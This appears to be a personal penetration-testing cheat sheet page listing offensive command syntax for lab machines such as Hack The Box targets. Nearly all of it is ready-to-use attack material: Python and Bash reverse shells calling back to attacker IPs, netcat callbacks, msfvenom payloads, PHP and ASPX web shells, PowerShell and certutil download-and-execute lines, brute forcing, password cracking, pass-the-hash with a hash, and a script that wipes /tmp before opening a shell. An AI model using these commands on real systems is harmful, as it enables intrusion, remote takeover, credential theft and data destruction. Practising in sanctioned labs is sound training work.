---
# the default layout is 'page'
icon: fas fa-info-circle
order: 2
---

<div align="center">
<h2>Helpful Syntaxes</h2>
</div>

| **Action** | **Syntax** |
| --- | --- |
| Dirbusting | `gobuster dir --url http://10.10.10.56/82/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,asp,aspx`<br>`dirbuster&`<br>`dirsearch -u http://10.10.10.9/ -e php -x 403,404 -t 50` |
| Setting up a listener | `nc -nlvp 4444`<br>`C:\wmpub\nc.exe -e cmd.exe 10.10.14.46 1556`<br>`?cmd=nc.exe -e cmd.exe 10.10.14.31 4314` |
| Python reverse shell | `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.16",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` |
| Simple file/exploit creation | `echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.46",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > exploit.py` |
| Local exploit suggester | `run post/multi/recon/local_exploit_suggester` |
| msfvenom payload | `msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.7 LPORT=1234 -o shell.aspx` |
| curl usage | `curl -X MOVE --header 'Destination:http://10.10.10.15/test.aspx' 'http://10.10.10.15/test.html'`<br>`curl -X PUT http://10.10.10.15/shell.txt -d @shell.txt` |
| Generic meterpreter shell | `use exploit/multi/handler`<br>`set payload windows/meterpreter/reverse_tcp` |
| Hosting the file for making it downloadable for another user | `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`<br>`copy \\10.10.14.46\kali\churrasco.exe C:\wmpub\churrasco.exe`<br>`copy \\10.10.14.46\kali\churrasco.exe C:\wmpub\churrasco.exe 1 file(s) copied.` |
| Hydra bruteforce | `hydra 10.10.10.43 -l muq -P /usr/share/seclists/Passwords/twitter-banned.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password”` |
| PHP injection | `<?php system($_REQUEST["cmd"]); ?>`<br>`<?php echo system($_REQUEST['cmd']); ?>` |
| Bash reverse shell | `bash -c 'bash -i >%26 /dev/tcp/10.10.14.19/443 0>%261'` |
| Bash spawn / Python | `python -c 'import pty;pty.spawn("bash")'` |
| Shell upgrade | `stty -a`<br>`stty raw -echo;fg —> hit enter twice`<br>`stty rows`<br>`stty cols` |
| Script for listing processes | `#!/bin/bash`<br>`#loop by line`<br>`IFS=$'\n'`<br>`old_process=$(ps -eo command)`<br>`while true; do new_process=$(ps -eo command)`<br>`diff <(echo "$old_process") <(echo "$new_process") |grep [\<\>]`<br>`sleep 1`<br>`old_process=$new_process done` |
| Checking for hidden content inside an image | `binwalk -Me` |
| Python code cleanup format | `:%s/;/\r/g` |
| Windows exploit suggester script | `python windows-exploit-suggester.py -d 2024-08-02-mssb.xls -i sysinfo.txt` |
| Searchsploit | `-x ; to look up the content of the exploit , mousepad for gui ,  -m to download` |
| Copying nc | `cp /usr/share/windows-binaries/nc.exe .` |
| Simple HTTPS server | `python -m SimpleHTTPServer 80` |
| Getting something from the simple server [WINDOWS-powershell] | `powershell -c "Invoke-WebRequest -Uri http://10.10.14.8/41020.exeChimichurri.exe -OutFile C:\ColdFusion8\runtime\bin\Chimichurri.exe"` |
| Hashcat | `hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt` |
| Certutil | `certutil -urlcache -f http://10.10.14.41/Chimichurri.exe chimichurri.exe`<br>`?cmd=certutil.exe -f -urlcache -split http://10.10.14.31/nc.exe nc.exe` |
| Wpscan script | `wpscan —url https://brainfuck.htb — disable-tls-checks` |
| John usage | `john crackthis --wordlist=/usr/share/wordlists/rockyou.txt` |
| SSH login w RSA key | `ssh -i  id_rsa orestis@brainfuck.htb` |
| PHP shell | `<?php system($_REQUEST["cmd"]); ?>` |
| DNS zone transfer | `USAGE- dig axfr @<DNS_IP> <DOMAIN>` |
| PHP reverse shell | `https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php` |
| Useful nmap script | `—script=oracle-sid-brute 10.10.10.12` |
| Nishang reverse shell | `cp /opt/powershell/nishang/Shells/Invoke-PowerShellTcp.ps1` |
| ASPX web shell | `/usr/share/webshells/aspx/cmdasp.aspx muq.aspx` |
| Using PowerShell to exec. content downloaded as a string | `powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31:8000/nish.ps1')` |
| Volatility | `python3 http://vol.py/ -f ~/Downloads/SILO-20180105-221806.dmp kdbgscan`<br>`python2 http://vol.py/ -f ~/Downloads/SILO-20180105-221806.dmp --profile Win2012R2x64 pstree` |
| Using hash dump | `pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 https://10.10.10.82/ cmd` |
| Reverse shell | `#!/usr/bin/env python`<br>`import os`<br>`import sys`<br>`try:`<br>`os.system('rm -r /tmp/* ')`<br>`except:`<br>`sys.exit()`<br>`os.system('bash -c "bash -i >& /dev/tcp/10.10.14.47/443 0>&1"')` |

<br>

<div align="center">
<h2>Useful Links</h2>
</div>
  

| **Description** | **Link** |
| --- | --- |
| Reverse shell cheat sheet | [Pentestmonkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) |
| SQL injection cheat sheet | [SQL Injection Cheat Sheet](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/) |
| Crontab Guru | [Crontab Guru](https://crontab.guru/) |
| PHP reverse shell | [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) |

